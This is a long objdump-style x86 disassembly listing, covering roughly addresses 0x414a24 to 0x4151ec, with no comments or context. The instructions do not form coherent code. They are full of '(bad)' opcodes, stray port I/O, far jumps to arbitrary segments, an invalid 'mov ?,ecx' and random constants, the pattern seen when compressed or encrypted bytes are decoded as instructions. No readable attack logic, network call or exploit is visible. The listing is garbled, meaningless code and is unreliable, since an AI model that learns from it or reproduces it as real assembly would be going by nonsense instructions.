  414a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a25:	push   eax
  414a26:	cmp    bl,BYTE PTR [ecx+0x66]
  414a29:	popf   
  414a2a:	jne    0x4149cb
  414a2c:	xchg   ecx,eax
  414a2d:	cdq    
  414a2e:	repnz mov esi,0x7d6d5f21
  414a34:	rcr    BYTE PTR [ecx+0x63],0x99
  414a38:	inc    esp
  414a39:	jne    0x414a23
  414a3b:	(bad)  
  414a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3d:	push   eax
  414a3e:	je     0x4149da
  414a40:	lock or DWORD PTR ds:0x9106ed6a,ebp
  414a47:	cdq    
  414a48:	add    ebp,DWORD PTR [ebp+0x0]
  414a4b:	xor    BYTE PTR [eax],dl
  414a4d:	in     eax,0xa9
  414a4f:	and    bh,BYTE PTR [edi+0x43cd47c0]
  414a55:	and    al,0x9c
  414a57:	(bad)  
  414a59:	fucomp st(4)
  414a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a5c:	or     DWORD PTR fs:[eax-0x35],0x90d7ac26
  414a64:	rcr    BYTE PTR [ecx-0x51c7e0d6],cl
  414a6a:	popf   
  414a6b:	sbb    dh,BYTE PTR [edx-0x48]
  414a6e:	je     0x414a32
  414a70:	adc    BYTE PTR [esi-0x587361dc],0x0
  414a77:	jo     0x414a51
  414a79:	jp     0x414a6c
  414a7b:	in     eax,dx
  414a7c:	jb     0x414a48
  414a7e:	xchg   DWORD PTR [eax],edx
  414a80:	out    0x2f,eax
  414a82:	unpckhps xmm5,xmm5
  414a85:	xor    esp,eax
  414a87:	lahf   
  414a88:	fiadd  WORD PTR [ebp+0x40771fd7]
  414a8e:	xchg   BYTE PTR [ebp-0x43cbe4bb],dl
  414a94:	fisttp QWORD PTR [edi]
  414a96:	xor    eax,0x172f618c
  414a9b:	pop    ecx
  414a9c:	mov    cl,BYTE PTR [eax]
  414a9e:	jne    0x414b01
  414aa0:	push   cs
  414aa1:	jp     0x414af8
  414aa3:	cdq    
  414aa4:	add    BYTE PTR [esi],al
  414aa6:	sbb    bl,0xf6
  414aa9:	in     al,0x1b
  414aab:	fisttp WORD PTR [edx]
  414aad:	dec    edx
  414aae:	mov    WORD PTR [eax],ds
  414ab0:	push   edi
  414ab1:	je     0x414a67
  414ab3:	dec    edx
  414ab4:	stos   BYTE PTR es:[edi],al
  414ab5:	jmp    0x7f72:0x41e86c49
  414abc:	or     eax,0xdfee56ad
  414ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ac3:	bound  ebp,QWORD PTR [edi+0x67]
  414ac6:	pop    edi
  414ac7:	mov    esp,0xee3f9e2e
  414acc:	jmp    0x414b44
  414ace:	add    BYTE PTR [edi-0x4a2ae30d],cl
  414ad4:	mov    bl,0x4a
  414ad6:	lahf   
  414ad7:	mov    eax,0x20e5ce40
  414adc:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414ade:	jle    0x414ad4
  414ae0:	pop    ebp
  414ae1:	repz push esp
  414ae3:	aad    0xf9
  414ae5:	mov    ecx,0xea1da1ec
  414aea:	retf   0x78b8
  414aed:	mov    cl,0xd9
  414aef:	jmp    0xd5fe2c62
  414af4:	in     eax,0xd1
  414af6:	xchg   dh,dh
  414af8:	fs adc eax,0x141be127
  414afe:	imul   ecx,DWORD PTR ds:0x94fcc9ab,0xdf820bf8
  414b08:	add    cl,bl
  414b0a:	loope  0x414b3b
  414b0c:	inc    BYTE PTR [ebx-0x68abbba5]
  414b12:	push   esp
  414b13:	aam    0xcd
  414b15:	test   dh,0xa5
  414b18:	dec    esi
  414b19:	in     al,0x21
  414b1b:	add    DWORD PTR [esp+ebx*8+0x1b],eax
  414b1f:	dec    ebx
  414b20:	add    al,0xa4
  414b22:	sbb    bh,BYTE PTR [edx-0x6]
  414b25:	cwde   
  414b26:	fbstp  TBYTE PTR [ebx+0x32365dfc]
  414b2c:	aas    
  414b2d:	and    dl,BYTE PTR [ecx+esi*2-0x76757885]
  414b34:	imul   edx,DWORD PTR [ecx],0x75
  414b37:	jnp    0x414b53
  414b39:	mov    DWORD PTR [edi-0x37598185],edx
  414b3f:	fbld   TBYTE PTR [esi+0x13b259f8]
  414b45:	ins    BYTE PTR es:[edi],dx
  414b46:	in     eax,dx
  414b47:	ins    DWORD PTR es:[edi],dx
  414b48:	clc    
  414b49:	add    BYTE PTR [ecx],bh
  414b4b:	(bad)  
  414b4c:	imul   edx,DWORD PTR [ebx],0x5ba13333
  414b52:	or     DWORD PTR [ebp+0x71],ebx
  414b55:	and    edi,DWORD PTR ds:0xff6ba427
  414b5b:	push   eax
  414b5c:	mov    ebx,0xd079d438
  414b61:	pop    esi
  414b62:	mov    cl,0x71
  414b64:	gs loope 0x414b92
  414b67:	jo     0x414aee
  414b69:	das    
  414b6a:	(bad)  
  414b6c:	dec    DWORD PTR [eax+0x3e]
  414b6f:	or     ah,0x7f
  414b72:	dec    eax
  414b73:	punpckhdq mm1,QWORD PTR [ecx+0x722dbfc2]
  414b7a:	dec    edx
  414b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b7d:	out    dx,eax
  414b7e:	inc    esi
  414b7f:	imul   eax,DWORD PTR [edi-0x58],0xf332e1e2
  414b86:	push   edi
  414b87:	jbe    0x414ba7
  414b89:	leave  
  414b8a:	icebp  
  414b8b:	test   DWORD PTR [eax+0x4a],edi
  414b8e:	in     al,dx
  414b8f:	leave  
  414b90:	mov    esi,gs
  414b92:	pusha  
  414b93:	loopne 0x414b61
  414b95:	mov    al,ds:0x4ec4a6b0
  414b9a:	inc    esp
  414b9b:	sbb    al,0xf8
  414b9d:	inc    esi
  414b9e:	sub    edi,ecx
  414ba0:	retf   0x9580
  414ba3:	stc    
  414ba4:	xchg   ebx,eax
  414ba5:	outs   dx,DWORD PTR ds:[esi]
  414ba6:	data16 loope 0x414b6a
  414ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414baa:	xchg   edx,eax
  414bab:	sub    al,BYTE PTR [ecx+0x5b07845d]
  414bb1:	inc    ebx
  414bb2:	imul   eax,DWORD PTR [esi+esi*2],0xffffff86
  414bb6:	dec    ecx
  414bb7:	repnz xchg esp,eax
  414bb9:	mov    bh,0x49
  414bbb:	leave  
  414bbc:	mov    edx,DWORD PTR [edi-0x5cadafc3]
  414bc2:	and    DWORD PTR [ebx+0x13],esi
  414bc5:	push   0xe939fa96
  414bca:	push   ebx
  414bcc:	fdiv   QWORD PTR es:[ecx]
  414bcf:	test   eax,0x697412df
  414bd4:	jecxz  0x414bfe
  414bd6:	inc    edi
  414bd7:	gs adc al,ch
  414bda:	mov    al,ds:0xa8da4855
  414bdf:	pop    edi
  414be0:	repz inc ebx
  414be2:	add    esi,esi
  414be4:	xor    bl,BYTE PTR [esi+0x49134acd]
  414bea:	mov    al,ds:0x4862c89e
  414bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf0:	int    0x8d
  414bf2:	or     al,0xb7
  414bf4:	lock or dl,BYTE PTR [edx]
  414bf7:	mov    ecx,0x12c06884
  414bfc:	(bad)  
  414bfd:	mov    bl,BYTE PTR [eax-0x792ec431]
  414c03:	mov    ebp,0x815f785
  414c08:	mov    ah,0x76
  414c0a:	mov    ebx,0x1924713d
  414c0f:	rol    DWORD PTR [ebx-0x3262358],0x69
  414c16:	test   DWORD PTR [edx-0x1e],ebp
  414c19:	rol    DWORD PTR [eax+0x918e1d9],1
  414c1f:	pop    eax
  414c20:	push   esi
  414c21:	mov    bh,0xd7
  414c23:	test   eax,0x1d56dd08
  414c28:	sbb    al,0xa3
  414c2a:	int3   
  414c2b:	mov    ah,0xb8
  414c2d:	jmp    0x3967:0x9f0febb4
  414c34:	mov    eax,ds:0x9c964eca
  414c39:	dec    esp
  414c3a:	or     al,0xdb
  414c3c:	jge    0x414c4c
  414c3e:	sar    BYTE PTR [edx-0x73],cl
  414c41:	in     eax,0xa4
  414c43:	cs cmp edi,ecx
  414c46:	ret    0x900f
  414c49:	shl    bh,1
  414c4b:	or     BYTE PTR [esi],bl
  414c4d:	mov    ch,0x16
  414c4f:	(bad)  
  414c50:	jns    0x414c61
  414c52:	add    esp,DWORD PTR [edi-0x21]
  414c55:	aam    0xed
  414c57:	outs   dx,DWORD PTR ds:[esi]
  414c58:	call   FWORD PTR [eax-0x4b01f6ac]
  414c5e:	and    DWORD PTR [ebp-0x27],esp
  414c61:	add    eax,0x341b42be
  414c66:	xchg   BYTE PTR [edi-0x76],ah
  414c69:	test   DWORD PTR [edx+ebp*8+0x640d6e69],ebp
  414c70:	xor    eax,0x70724b87
  414c75:	mov    edx,ebx
  414c77:	arpl   WORD PTR [ebx+0xe],bp
  414c7a:	xchg   ebp,eax
  414c7b:	sbb    al,0xb4
  414c7d:	sbb    ecx,DWORD PTR [ecx+0x7f]
  414c80:	and    ebx,DWORD PTR [ecx]
  414c82:	movq   QWORD PTR [ebx-0x89da690],mm0
  414c89:	int    0x1c
  414c8b:	dec    ebx
  414c8c:	mov    ah,BYTE PTR [esi]
  414c8e:	sub    eax,0x8bafd0
  414c93:	icebp  
  414c94:	inc    ecx
  414c95:	loope  0x414cf9
  414c97:	jecxz  0x414ce7
  414c99:	push   esi
  414c9a:	cld    
  414c9b:	outs   dx,BYTE PTR ds:[esi]
  414c9c:	das    
  414c9d:	icebp  
  414c9e:	(bad)  
  414c9f:	pop    ecx
  414ca0:	es out dx,eax
  414ca2:	lods   eax,DWORD PTR ds:[esi]
  414ca3:	scas   al,BYTE PTR es:[edi]
  414ca4:	mov    ch,0x68
  414ca6:	pop    esp
  414ca7:	les    edi,FWORD PTR [eax-0xc]
  414caa:	ins    DWORD PTR es:[edi],dx
  414cab:	cdq    
  414cac:	sbb    DWORD PTR [eax],esp
  414cae:	xchg   ecx,eax
  414caf:	cmp    bh,bl
  414cb1:	aaa    
  414cb2:	imul   edi,DWORD PTR [edi],0xe29a337e
  414cb8:	xchg   ebp,eax
  414cb9:	call   0x12c204d0
  414cbe:	lods   al,BYTE PTR ds:[esi]
  414cbf:	and    BYTE PTR [eax+eiz*8],ah
  414cc2:	pop    edi
  414cc3:	sbb    DWORD PTR ds:0x5e99b056,0xc8eeb96a
  414ccd:	ret    0x71f2
  414cd0:	push   eax
  414cd1:	ins    DWORD PTR es:[edi],dx
  414cd2:	outs   dx,DWORD PTR ds:[esi]
  414cd3:	mov    al,ds:0xf1172fef
  414cd8:	cli    
  414cd9:	and    dh,ch
  414cdb:	adc    edi,DWORD PTR [edi]
  414cdd:	icebp  
  414cde:	pop    esi
  414cdf:	retf   0x7981
  414ce2:	pop    eax
  414ce3:	mov    ebp,0xec62657c
  414ce8:	out    0x16,al
  414cea:	in     eax,0x54
  414cec:	pop    ds
  414ced:	iret   
  414cee:	pop    eax
  414cef:	les    edi,FWORD PTR [eax+0x88d981a]
  414cf5:	sbb    eax,0xe245e3d9
  414cfa:	out    dx,al
  414cfb:	cmp    al,0xf5
  414cfd:	sbb    eax,eax
  414cff:	xchg   ebx,eax
  414d00:	push   es
  414d01:	arpl   bp,bp
  414d03:	xchg   edi,eax
  414d04:	lock fiadd WORD PTR [edx]
  414d07:	push   0xffffff8e
  414d09:	add    BYTE PTR [eax-0x53ff53de],ch
  414d0f:	or     BYTE PTR [edx+0x47c98db8],0xc9
  414d16:	(bad)  
  414d17:	push   cs
  414d18:	lea    ebp,ds:0xfccb4ad8
  414d1e:	fcomp  DWORD PTR [ebp+0x6f175e8d]
  414d24:	and    esi,DWORD PTR [edi+ebp*1]
  414d27:	loop   0x414d38
  414d29:	xor    ah,cl
  414d2b:	(bad)  
  414d2c:	(bad)  
  414d2e:	mov    ecx,0x75542a1e
  414d33:	ret    
  414d34:	mov    edi,0x940aa9c2
  414d39:	push   0x4c93cf56
  414d3e:	std    
  414d3f:	(bad)  
  414d41:	or     eax,0x980d5ad
  414d46:	cmp    eax,0xcc652d5
  414d4b:	xor    eax,0x18fb18ec
  414d50:	push   0xb979f027
  414d55:	dec    ebx
  414d56:	int3   
  414d57:	and    ah,BYTE PTR [ebp+0x40]
  414d5a:	jmp    0x236c:0x5b33020a
  414d61:	lds    edi,FWORD PTR [edx+0x5e02475e]
  414d67:	push   edi
  414d68:	rcl    dh,cl
  414d6a:	jne    0x414d15
  414d6c:	xchg   ebp,eax
  414d6d:	sbb    BYTE PTR [edi],0x51
  414d70:	daa    
  414d71:	mov    ch,0x2b
  414d73:	in     al,0xa8
  414d75:	push   0xc51a4b59
  414d7a:	cmp    bl,dl
  414d7c:	mov    ds:0xb266af22,eax
  414d81:	aad    0x34
  414d83:	pop    edx
  414d84:	sbb    BYTE PTR [eax-0x38],al
  414d87:	call   0x75ab:0x63eafe34
  414d8e:	out    0x3d,al
  414d90:	cmp    BYTE PTR [ebx],al
  414d92:	gs popf 
  414d94:	jp     0x414d6f
  414d96:	out    0x5e,eax
  414d98:	add    eax,0x58a34c68
  414d9d:	jecxz  0x414d6b
  414d9f:	or     eax,0xc53cafd0
  414da4:	sbb    BYTE PTR [eax+0x29d3fb38],dh
  414daa:	enter  0x6ae,0x69
  414dae:	pop    edx
  414daf:	add    BYTE PTR [eax],cl
  414db1:	repz adc esp,DWORD PTR [edx+0x915d48e]
  414db8:	scas   al,BYTE PTR es:[edi]
  414db9:	(bad)  
  414dba:	enter  0x2a48,0x6b
  414dbe:	xor    eax,0xb1f99c91
  414dc3:	adc    esp,DWORD PTR ds:0x89941ed1
  414dc9:	xchg   edx,eax
  414dca:	retf   0x4044
  414dcd:	push   ebp
  414dce:	sub    BYTE PTR [ebx-0x1c],al
  414dd1:	cs (bad) 
  414dd3:	lods   al,BYTE PTR ds:[esi]
  414dd4:	add    dh,dl
  414dd6:	adc    esp,eax
  414dd8:	mov    ds:0xb0c6afd4,al
  414ddd:	stc    
  414dde:	mov    eax,es:0x73bd9b73
  414de4:	sub    eax,0x5bc72483
  414de9:	jo     0x414d8b
  414deb:	loop   0x414d90
  414ded:	or     DWORD PTR [edi],ebp
  414def:	mov    ebp,DWORD PTR [ecx-0x2c64bf91]
  414df5:	inc    edi
  414df6:	pop    ebp
  414df7:	cdq    
  414df8:	in     al,0x4a
  414dfa:	(bad)  
  414dfb:	hlt    
  414dfc:	call   0x99aa2c78
  414e01:	enter  0x32a8,0xfe
  414e05:	push   es
  414e06:	scas   al,BYTE PTR es:[edi]
  414e07:	fdiv   st(5),st
  414e09:	pop    edi
  414e0a:	retf   0xff2
  414e0d:	jae    0x414df7
  414e0f:	repz xchg ecx,eax
  414e11:	xchg   ebp,eax
  414e12:	xchg   esp,eax
  414e13:	sub    bl,BYTE PTR [esi+ebx*2]
  414e16:	push   edx
  414e17:	xchg   ebp,eax
  414e18:	add    al,BYTE PTR ds:0xf7898c63
  414e1e:	dec    esi
  414e1f:	xchg   ecx,eax
  414e20:	popa   
  414e21:	add    dl,BYTE PTR [ecx+0x24]
  414e24:	jmp    0x4656:0xe21a4b2c
  414e2b:	ror    BYTE PTR [ebp+0x305c9c48],1
  414e31:	push   ds
  414e32:	je     0x414e3b
  414e34:	sub    edi,ebp
  414e36:	or     ebp,DWORD PTR [ecx+0x62be49ae]
  414e3c:	and    BYTE PTR [edx-0x4326aa62],bl
  414e42:	inc    edi
  414e43:	ins    BYTE PTR es:[edi],dx
  414e44:	scas   al,BYTE PTR es:[edi]
  414e45:	mov    cl,0x53
  414e47:	push   esi
  414e48:	jmp    0x21b6:0x85cff67a
  414e4f:	or     eax,0x5ed1bfc8
  414e54:	sub    DWORD PTR [ecx-0x14],esp
  414e57:	in     al,dx
  414e58:	add    BYTE PTR [ecx+0x6b],ah
  414e5b:	mov    ebp,DWORD PTR [ebx-0x7bdcead0]
  414e61:	add    esi,edi
  414e63:	dec    ecx
  414e64:	jne    0x414ec5
  414e66:	xchg   BYTE PTR [ebx],ah
  414e68:	loopne 0x414e91
  414e6a:	pop    ds
  414e6b:	je     0x414e8b
  414e6d:	aad    0x56
  414e6f:	scas   eax,DWORD PTR es:[edi]
  414e70:	adc    cl,al
  414e72:	push   0x18a17b17
  414e77:	dec    eax
  414e78:	mov    BYTE PTR [edx-0x15c6554c],0xec
  414e7f:	inc    esp
  414e80:	lea    edx,[eax+0x6c7dafe1]
  414e86:	nop
  414e87:	inc    ebx
  414e88:	sub    edi,ecx
  414e8a:	jl     0x414e8a
  414e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e8d:	in     al,dx
  414e8e:	test   al,0x32
  414e90:	in     al,0x38
  414e92:	fstp   QWORD PTR [ebp+0x4986edf]
  414e98:	in     al,dx
  414e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9a:	inc    edx
  414e9b:	call   0x9d664260
  414ea0:	imul   BYTE PTR [edi-0x71175cb4]
  414ea6:	push   cs
  414ea7:	and    BYTE PTR ds:[edi-0xed4d556],dh
  414eae:	or     dh,BYTE PTR [esi]
  414eb0:	je     0x414e49
  414eb2:	xchg   ebx,eax
  414eb3:	mov    ebp,0x36bad529
  414eb8:	or     DWORD PTR [ecx],ebp
  414eba:	xor    BYTE PTR [esi+0x7a],cl
  414ebd:	mov    edi,0x26957544
  414ec2:	out    0x7a,al
  414ec4:	in     al,dx
  414ec5:	xor    BYTE PTR cs:[edx],0xab
  414ec9:	icebp  
  414eca:	xchg   BYTE PTR [ebx+0x66],bl
  414ecd:	inc    edi
  414ece:	into   
  414ecf:	fisubr WORD PTR [ecx]
  414ed1:	int    0x62
  414ed3:	jmp    0x152c2fed
  414ed8:	dec    esp
  414ed9:	fidiv  DWORD PTR [ecx]
  414edb:	mov    cl,0xbf
  414edd:	shr    BYTE PTR [eax],cl
  414edf:	pop    eax
  414ee0:	outs   dx,BYTE PTR ds:[esi]
  414ee1:	mov    ecx,0x39e1d028
  414ee6:	int3   
  414ee7:	dec    esi
  414ee8:	leave  
  414ee9:	sub    dl,ch
  414eeb:	aad    0x5b
  414eed:	pop    edx
  414eee:	dec    ebp
  414eef:	sbb    al,0x97
  414ef1:	inc    edx
  414ef2:	loopne 0x414e92
  414ef4:	jne    0x414ee2
  414ef6:	(bad)  
  414ef7:	mov    esi,0xfa543c78
  414efc:	fadd   QWORD PTR [ebx-0x34e9c31]
  414f02:	rcr    BYTE PTR [ebp-0x113f1180],1
  414f08:	add    al,0x83
  414f0a:	cmp    eax,0x825628fe
  414f0f:	add    edi,eax
  414f11:	fs mov bh,0x6c
  414f14:	ret    
  414f15:	adc    al,BYTE PTR [ebx-0x52]
  414f18:	adc    eax,0xebd7595a
  414f1d:	pop    edx
  414f1e:	adc    BYTE PTR [esi],bh
  414f20:	push   0xbadaf38b
  414f25:	mov    dh,0xec
  414f27:	push   ss
  414f28:	les    esi,FWORD PTR [edx-0x14117e20]
  414f2e:	mov    ds:0xffa1368e,eax
  414f33:	scas   eax,DWORD PTR es:[edi]
  414f34:	cmc    
  414f35:	push   esp
  414f36:	iret   
  414f37:	inc    esp
  414f38:	push   cs
  414f39:	mov    edx,0xc3a6cba
  414f3e:	leave  
  414f3f:	cmc    
  414f40:	add    al,0x41
  414f42:	jbe    0x414fbc
  414f44:	lock and BYTE PTR ds:0xd3fefb9,0x1c
  414f4c:	rol    DWORD PTR [esi+ebp*4+0x22f8774],cl
  414f53:	mov    ebx,DWORD PTR [edi+0x34]
  414f56:	cmp    eax,0xcc6e487e
  414f5b:	lds    edx,FWORD PTR [ebp+0x62]
  414f5e:	xchg   ecx,eax
  414f5f:	lock ret 
  414f61:	cmp    al,0x3e
  414f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f64:	(bad)  
  414f65:	push   edi
  414f66:	clc    
  414f67:	fdiv   QWORD PTR [eax]
  414f69:	or     BYTE PTR [eax+0x17],bl
  414f6c:	jp     0x414f65
  414f6e:	ret    0xb0b7
  414f71:	push   ss
  414f72:	mov    esi,0x757ea31d
  414f77:	or     al,0xd4
  414f79:	sub    al,BYTE PTR [eax+0x6ab96d39]
  414f7f:	or     DWORD PTR [edi],edi
  414f81:	(bad)  
  414f82:	fadd   st(5),st
  414f84:	mov    bl,0x1e
  414f86:	pop    esi
  414f87:	addr16 test al,0xbd
  414f8a:	daa    
  414f8b:	das    
  414f8c:	loope  0x414f80
  414f8e:	test   BYTE PTR [eax],cl
  414f90:	pop    eax
  414f91:	out    0xf9,al
  414f93:	xor    bh,BYTE PTR [edx-0x1c2aaf22]
  414f99:	mov    DWORD PTR [edx],edi
  414f9b:	sahf   
  414f9c:	fcomp  QWORD PTR [esi-0x11]
  414f9f:	mov    dl,0x7f
  414fa1:	mov    edx,0x9fef0e9c
  414fa6:	mov    ds:0x10a32141,eax
  414fab:	mov    cl,0x88
  414fad:	cmp    BYTE PTR [edx+0x25],dh
  414fb0:	ds mov bl,0x98
  414fb3:	je     0x414fa1
  414fb5:	fdiv   DWORD PTR [ebp-0x7fc09792]
  414fbb:	mov    es,WORD PTR [edi-0x18]
  414fbe:	cmp    eax,0x5c4aaacc
  414fc3:	in     eax,dx
  414fc4:	dec    edi
  414fc5:	cmc    
  414fc6:	enter  0xc306,0xc4
  414fca:	lock rol BYTE PTR fs:[ebx],0x58
  414fcf:	mov    eax,DWORD PTR [edx+0x72]
  414fd2:	dec    BYTE PTR [esi+0x385d5cc0]
  414fd8:	cmp    DWORD PTR [ebp+0x5d],ebp
  414fdb:	mov    esi,0x56ccbb60
  414fe0:	(bad)  
  414fe1:	lea    esp,[esi]
  414fe3:	pop    ecx
  414fe4:	push   cs
  414fe5:	retf   0xaee9
  414fe8:	sti    
  414fe9:	add    bl,ch
  414feb:	xchg   ecx,eax
  414fec:	loopne 0x414fc5
  414fee:	jbe    0x414fcc
  414ff0:	test   eax,0xf57da1ae
  414ff5:	sahf   
  414ff6:	lods   al,BYTE PTR ds:[esi]
  414ff7:	stos   DWORD PTR es:[edi],eax
  414ff8:	out    0x73,al
  414ffa:	pop    ebp
  414ffb:	adc    al,0x3b
  414ffd:	test   al,0x79
  414fff:	aas    
  415000:	push   eax
  415001:	mov    gs,WORD PTR [eax-0x7822820e]
  415007:	sub    DWORD PTR [ebx-0x70],0xe5f6d81c
  41500e:	push   ecx
  41500f:	repnz clc 
  415011:	xor    al,BYTE PTR [ecx]
  415013:	enter  0x43d9,0xab
  415017:	jns    0x41500a
  415019:	fild   WORD PTR [esi-0x1f]
  41501c:	jne    0x414ff9
  41501e:	mov    ch,0xb8
  415020:	rol    ebp,cl
  415022:	pop    ebx
  415023:	test   al,0xf7
  415025:	mov    WORD PTR [edx],ss
  415027:	dec    eax
  415028:	xchg   esp,eax
  415029:	fs nop
  41502b:	dec    eax
  41502c:	cs loopne 0x41502c
  41502f:	mov    esi,0x1a4b4618
  415034:	loopne 0x414fcd
  415036:	inc    esi
  415037:	push   esp
  415038:	sbb    cl,BYTE PTR [ebx+0x5a475c3a]
  41503e:	jbe    0x415072
  415040:	fdiv   DWORD PTR [ebx+0x68]
  415043:	mov    bl,0xd
  415045:	xchg   ebp,eax
  415046:	ins    BYTE PTR es:[edi],dx
  415047:	mov    ds:0x417b6fc4,eax
  41504c:	xchg   esi,eax
  41504d:	stos   DWORD PTR es:[edi],eax
  41504e:	cmp    eax,0xcc0fa519
  415053:	jae    0x414fd8
  415055:	jo     0x41504e
  415057:	cdq    
  415058:	xchg   esi,eax
  415059:	shl    BYTE PTR [ecx],0x76
  41505c:	je     0x415008
  41505e:	loop   0x415039
  415060:	out    dx,eax
  415061:	and    edi,edx
  415063:	mov    eax,0x6fb3c9b9
  415068:	jbe    0x415060
  41506a:	fiadd  WORD PTR [ecx+0x6a]
  41506d:	sbb    esp,eax
  41506f:	scas   al,BYTE PTR es:[edi]
  415070:	xchg   DWORD PTR [ebx+0xc],edx
  415073:	arpl   WORD PTR [eax-0x79970997],sp
  415079:	je     0x4150dd
  41507b:	add    BYTE PTR [ecx+0x778c1f6d],al
  415081:	shl    BYTE PTR [ebx-0x5],1
  415084:	ja     0x41508e
  415086:	iret   
  415087:	aad    0x1f
  415089:	push   ds
  41508a:	(bad)  
  41508b:	mov    ch,0xa
  41508d:	mov    fs,WORD PTR [ecx+0x4d530321]
  415093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415094:	jne    0x415077
  415096:	xor    esp,DWORD PTR [edx+0x2]
  415099:	test   BYTE PTR [ecx+0x33139cdf],ah
  41509f:	mov    ds:0x486ad17,eax
  4150a4:	data16 jb 0x41505d
  4150a7:	(bad)  
  4150a8:	xor    ebp,DWORD PTR [edx+ebx*2]
  4150ab:	sbb    BYTE PTR [ebx-0x15d0a085],ah
  4150b1:	arpl   bx,di
  4150b3:	fwait
  4150b4:	out    0x99,eax
  4150b6:	xchg   ecx,eax
  4150b7:	(bad)  
  4150b8:	aaa    
  4150b9:	pushf  
  4150ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150bb:	fwait
  4150bc:	stos   BYTE PTR es:[edi],al
  4150bd:	mov    cl,0x3d
  4150bf:	dec    edi
  4150c0:	outs   dx,BYTE PTR ds:[esi]
  4150c1:	fwait
  4150c2:	cli    
  4150c3:	xor    dh,dh
  4150c5:	iret   
  4150c6:	xchg   DWORD PTR [esi+esi*8],edx
  4150c9:	adc    ch,BYTE PTR [esi-0x35]
  4150cc:	add    eax,0x12225c1
  4150d1:	pop    ecx
  4150d2:	pop    esi
  4150d3:	mov    esi,0x722a0cb7
  4150d8:	xchg   edi,eax
  4150d9:	inc    esp
  4150da:	dec    edi
  4150db:	mov    ecx,0xf5b6f03e
  4150e0:	int3   
  4150e1:	cmp    ebp,ebx
  4150e3:	xor    DWORD PTR [eax-0x235ed4f8],ebp
  4150e9:	cdq    
  4150ea:	mov    ?,ecx
  4150ec:	add    eax,0xadf3f3af
  4150f1:	jle    0x415115
  4150f3:	push   0x66
  4150f5:	aam    0x8d
  4150f7:	inc    esp
  4150f8:	sbb    DWORD PTR [ebx+0x122b51e2],edi
  4150fe:	rol    eax,cl
  415100:	jl     0x4150ce
  415102:	sahf   
  415103:	xor    al,BYTE PTR [ebx-0x15]
  415106:	sub    BYTE PTR [edi],0x6a
  415109:	enter  0xcf49,0x40
  41510d:	cs loop 0x415158
  415110:	mov    DWORD PTR [ecx+0x3a],ebx
  415113:	test   al,0x7d
  415115:	jbe    0x41515b
  415117:	leave  
  415118:	mov    ebx,0xde1986e6
  41511d:	int    0xb0
  41511f:	fisubr DWORD PTR [esp+ecx*2+0x2ee87aca]
  415126:	sar    DWORD PTR [edx-0x74],1
  415129:	gs dec edx
  41512b:	outs   dx,BYTE PTR ds:[esi]
  41512c:	test   esp,0xe975f00e
  415132:	xchg   BYTE PTR [edi+0x8d39504],cl
  415138:	mov    al,ds:0x1c51aa60
  41513d:	(bad)  
  41513e:	xor    al,0x21
  415140:	mov    bl,0x1c
  415142:	test   eax,0x2be85635
  415147:	add    ch,BYTE PTR [edx+0x1a63b88d]
  41514d:	mov    WORD PTR gs:[edx-0x31],fs
  415151:	push   es
  415152:	jne    0x41514a
  415154:	mov    cl,BYTE PTR [eax-0x22]
  415157:	in     al,0x3b
  415159:	jge    0x41512b
  41515b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41515c:	sbb    ebx,ebp
  41515e:	push   ds
  41515f:	and    DWORD PTR [esi+0x6f],ebp
  415162:	mov    cl,BYTE PTR [edx-0x1a]
  415165:	enter  0xa9f7,0x73
  415169:	pop    ebx
  41516a:	aaa    
  41516b:	or     esp,DWORD PTR [esi+0x5bb52036]
  415171:	gs inc edx
  415173:	out    dx,eax
  415174:	pushf  
  415175:	imul   DWORD PTR ds:0xc933da72
  41517b:	jge    0x4151ba
  41517d:	jno    0x415177
  41517f:	cmp    DWORD PTR [ecx],0x2
  415182:	lock push ebx
  415184:	call   0xa48ce763
  415189:	dec    edi
  41518a:	icebp  
  41518b:	xor    esp,ebp
  41518d:	mov    dh,0x22
  41518f:	mov    DWORD PTR [eax+0x4cf61ead],ecx
  415195:	mov    cl,0xc7
  415197:	lds    ebp,FWORD PTR [ecx+0x5d]
  41519a:	fimul  DWORD PTR [edi-0x60]
  41519d:	stos   DWORD PTR es:[edi],eax
  41519e:	aam    0xb7
  4151a0:	iret   
  4151a1:	arpl   WORD PTR [esi+0x3f1771a0],di
  4151a7:	jbe    0x415195
  4151a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151aa:	(bad)  
  4151ab:	sbb    ah,BYTE PTR [edx]
  4151ad:	xchg   ebp,eax
  4151ae:	push   esp
  4151af:	mov    edi,0x7669ac34
  4151b4:	xchg   ecx,eax
  4151b5:	lahf   
  4151b6:	aas    
  4151b7:	jb     0x415168
  4151b9:	or     DWORD PTR [eax],ebx
  4151bb:	mov    BYTE PTR [edi+ebp*2-0x5af3a9ab],al
  4151c2:	mov    ds:0x6048c4bb,eax
  4151c7:	add    al,0x52
  4151c9:	inc    esp
  4151ca:	cmp    DWORD PTR [edx+ebp*1+0x57],0x25
  4151cf:	pop    ebx
  4151d0:	jns    0x415221
  4151d2:	xchg   ecx,eax
  4151d3:	push   es
  4151d4:	sbb    DWORD PTR [esp+eiz*4],0x13
  4151d8:	xchg   edx,eax
  4151d9:	jl     0x4151ae
  4151db:	nop
  4151dc:	ins    BYTE PTR es:[edi],dx
  4151dd:	jl     0x41517d
  4151df:	xlat   BYTE PTR ds:[ebx]
  4151e0:	mov    esi,0x7439f108
  4151e5:	arpl   WORD PTR [edx-0x2b929824],ax
  4151eb:	inc    ecx
  4151ec:	pop    eax
